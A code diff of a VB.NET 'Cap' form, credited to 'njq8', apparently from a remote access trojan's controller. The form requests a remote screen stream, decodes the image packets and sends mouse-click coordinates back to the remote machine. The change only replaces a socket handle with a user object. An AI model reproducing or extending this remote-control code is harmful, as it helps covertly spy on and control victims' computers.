@@ -1,7 +1,7 @@
 ﻿Public Class Cap
     'credit to njq8
     Public F As Form1 '<< ?
-    Public Sock As Integer
+    Public u As USER
     Public Sz As Size
     Private Sub Cap_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         On Error Resume Next
@@ -20,7 +20,7 @@
     Public Sub PktToImage(ByVal BY As Byte())
         On Error Resume Next
         If Button1.Text = "Stop" Then
-            F.S.Send(Sock, "@" & F.SPL & C1.SelectedIndex & F.SPL & C2.Text & F.SPL & C.Value)
+            F.S.Send(u, "@" & F.SPL & C1.SelectedIndex & F.SPL & C2.Text & F.SPL & C.Value)
         End If
         Dim B As Array = fx(BY, "njq8")
         Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
@@ -94,7 +94,7 @@
     Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
         On Error Resume Next
         If Button1.Text = "Start" Then
-            F.S.Send(Sock, "@" & F.SPL & C1.SelectedIndex & F.SPL & C2.Text & F.SPL & C.Value)
+            F.S.Send(u, "@" & F.SPL & C1.SelectedIndex & F.SPL & C2.Text & F.SPL & C.Value)
             Button1.Text = "Stop"
         Else
             Button1.Text = "Start"
@@ -110,7 +110,7 @@
                 pp.X = op.X
                 pp.Y = op.Y
                 op = Nothing
-                F.S.Send(Sock, "$" & F.SPL & pp.X & F.SPL & pp.Y & F.SPL)
+                F.S.Send(u, "$" & F.SPL & pp.X & F.SPL & pp.Y & F.SPL)
             End If
         End If
         Timer1.Enabled = True
